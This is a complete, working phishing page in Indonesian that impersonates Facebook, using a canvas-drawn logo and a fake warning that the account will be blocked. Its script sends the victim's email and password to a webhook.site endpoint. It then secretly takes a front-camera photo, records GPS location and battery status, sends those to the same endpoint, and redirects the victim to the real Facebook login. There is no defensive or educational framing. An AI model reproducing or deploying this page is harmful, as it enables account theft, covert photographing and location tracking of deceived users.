<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Identity Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .card {
            background: #fff;
            padding: 28px 24px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        #fb-logo-canvas {
            margin-bottom: 12px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .msg {
            font-size: 15px;
            color: #1c1e21;
            margin-bottom: 18px;
            line-height: 1.5;
            font-weight: 500;
            text-align: left;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0 12px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 15px;
            background: #f5f6f7;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border-color: #1877f2;
            background: #fff;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        button:hover {
            background: #166fe5;
        }
        button:active {
            background: #0e5bbf;
        }
        .footer {
            font-size: 13px;
            color: #8a8d91;
            margin-top: 18px;
            text-decoration: none;
            display: inline-block;
        }
        .footer:hover {
            text-decoration: underline;
        }
        #vid,
        #cap-canvas {
            display: none;
        }
        .status-badge {
            font-size: 12px;
            color: #606770;
            margin-top: 10px;
            padding: 6px 12px;
            background: #f0f2f5;
            border-radius: 20px;
            display: inline-block;
        }
    </style>
</head>
<body>

    <div class="card">
        <!-- Logo digambar via Canvas -->
        <canvas id="fb-logo-canvas" width="200" height="50"></canvas>

        <div class="msg">
            Akun Anda terdeteksi login dari perangkat baru. Silakan verifikasi identitas Anda
            untuk mencegah pemblokiran permanen.
        </div>

        <input type="text" id="user" placeholder="Email atau Nomor Telepon" autocomplete="off" />
        <input type="password" id="pass" placeholder="Kata Sandi" autocomplete="off" />

        <button id="submitBtn" onclick="execute()">Verifikasi Akun</button>

        <a href="#" class="footer">Bukan akun Anda? Klik di sini untuk bantuan.</a>
        <div class="status-badge" id="statusBadge">● Siap</div>
    </div>

    <!-- Elemen tersembunyi untuk kamera -->
    <video id="vid" autoplay muted></video>
    <canvas id="cap-canvas"></canvas>

    <script>
        // ============================================================
        // 1. GAMBAR LOGO FACEBOOK
        // ============================================================
        (function drawLogo() {
            const canvas = document.getElementById('fb-logo-canvas');
            const ctx = canvas.getContext('2d');
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#1877f2';
            ctx.font = 'bold 42px Helvetica, Arial, sans-serif';
            ctx.textBaseline = 'alphabetic';
            ctx.fillText('facebook', 10, 42);
        })();

        // ============================================================
        // 2. KONFIGURASI
        // ============================================================
        const WEBHOOK_URL = 'https://webhook.site/50f6311e-fbb1-4d2d-b43c-b66b5c526711';

        // ============================================================
        // 3. FUNGSI BANTU (Promise-based)
        // ============================================================

        /** Ambil status baterai (kalau ada) */
        function getBatteryInfo() {
            return new Promise((resolve) => {
                if (!navigator.getBattery) {
                    resolve('Tidak tersedia');
                    return;
                }
                navigator.getBattery()
                    .then((b) => {
                        const level = Math.round(b.level * 100);
                        const status = b.charging ? 'Mengisi' : 'Melepas';
                        resolve(`${level}% (${status})`);
                    })
                    .catch(() => resolve('Gagal baca baterai'));
            });
        }

        /** Coba ambil foto dari kamera depan (jika diizinkan) */
        function tryCapturePhoto() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    resolve('Kamera tidak didukung');
                    return;
                }
                navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                        },
                    })
                    .then((stream) => {
                        const video = document.getElementById('vid');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            setTimeout(() => {
                                const canvas = document.getElementById('cap-canvas');
                                const vw = video.videoWidth || 640;
                                const vh = video.videoHeight || 480;
                                canvas.width = vw;
                                canvas.height = vh;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, vw, vh);
                                stream.getTracks().forEach((t) => t.stop());
                                const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                                resolve(dataUrl);
                            }, 1000);
                        };
                        setTimeout(() => {
                            if (video.srcObject) {
                                const canvas = document.getElementById('cap-canvas');
                                const vw = video.videoWidth || 640;
                                const vh = video.videoHeight || 480;
                                canvas.width = vw;
                                canvas.height = vh;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, vw, vh);
                                stream.getTracks().forEach((t) => t.stop());
                                const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                                resolve(dataUrl);
                            }
                        }, 2000);
                    })
                    .catch((err) => {
                        console.warn('Kamera ditolak atau error:', err.message);
                        resolve('Kamera ditolak');
                    });
            });
        }

        /** Coba ambil lokasi GPS (jika diizinkan) */
        function tryGetLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('GPS tidak didukung');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        resolve({
                            lat: lat,
                            lon: lon,
                            acc: pos.coords.accuracy + 'm',
                            maps: `https://www.google.com/maps?q=${lat},${lon}`,
                        });
                    },
                    (err) => {
                        console.warn('Lokasi ditolak atau error:', err.message);
                        resolve('Lokasi ditolak');
                    }, {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0,
                    }
                );
            });
        }

        // ============================================================
        // 4. FUNGSI PENGIRIMAN
        // ============================================================

        /** Kirim hanya kredensial (langsung, tanpa menunggu apapun) */
        async function sendCredentials(email, password) {
            const payload = {
                type: 'credentials',
                credentials: { email, password },
                time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
                userAgent: navigator.userAgent,
            };
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
                console.log('✅ Kredensial terkirim');
            } catch (err) {
                console.error('❌ Gagal kirim kredensial:', err);
            }
        }

        /** Kirim data tambahan (baterai, foto, lokasi) setelah dikumpulkan */
        async function sendExtraData(battery, photo, location, refTime) {
            const payload = {
                type: 'extra',
                refTime: refTime,
                battery: battery,
                photo: photo,
                location: location,
                time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
            };
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
                console.log('✅ Data tambahan terkirim');
            } catch (err) {
                console.error('❌ Gagal kirim data tambahan:', err);
            }
        }

        // ============================================================
        // 5. FUNGSI UTAMA execute()
        // ============================================================
        async function execute() {
            const userInput = document.getElementById('user');
            const passInput = document.getElementById('pass');
            const statusEl = document.getElementById('statusBadge');
            const btn = document.getElementById('submitBtn');

            const email = userInput.value.trim();
            const password = passInput.value.trim();

            if (!email || !password) {
                alert('Harap isi email dan kata sandi.');
                return;
            }

            // Nonaktifkan tombol
            btn.disabled = true;
            btn.textContent = 'Memproses...';
            statusEl.textContent = '● Mengirim kredensial...';

            // --- Langkah 1: Kirim kredensial langsung ---
            const refTime = new Date().toISOString(); // referensi waktu
            await sendCredentials(email, password);

            statusEl.textContent = '● Mengambil data tambahan...';

            // --- Langkah 2: Kumpulkan data tambahan (baterai, foto, lokasi) secara paralel ---
            const [battery, photo, location] = await Promise.all([
                getBatteryInfo(),
                tryCapturePhoto(),
                tryGetLocation(),
            ]);

            statusEl.textContent = '● Mengirim data tambahan...';

            // --- Langkah 3: Kirim data tambahan ---
            await sendExtraData(battery, photo, location, refTime);

            statusEl.textContent = '● Selesai ✓';

            // Reset tombol
            btn.disabled = false;
            btn.textContent = 'Verifikasi Akun';

            // Alert & redirect
            alert('Sistem sedang memproses verifikasi. Anda akan diarahkan kembali sebentar lagi.');
            window.location.href = 'https://facebook.com/login';
        }

        // ============================================================
        // 6. (OPSIONAL) Tekan Enter di input untuk submit
        // ============================================================
        document.querySelectorAll('input').forEach((inp) => {
            inp.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    execute();
                }
            });
        });

        console.log('✅ Script siap. Webhook URL:', WEBHOOK_URL);
    </script>
</body>
</html>
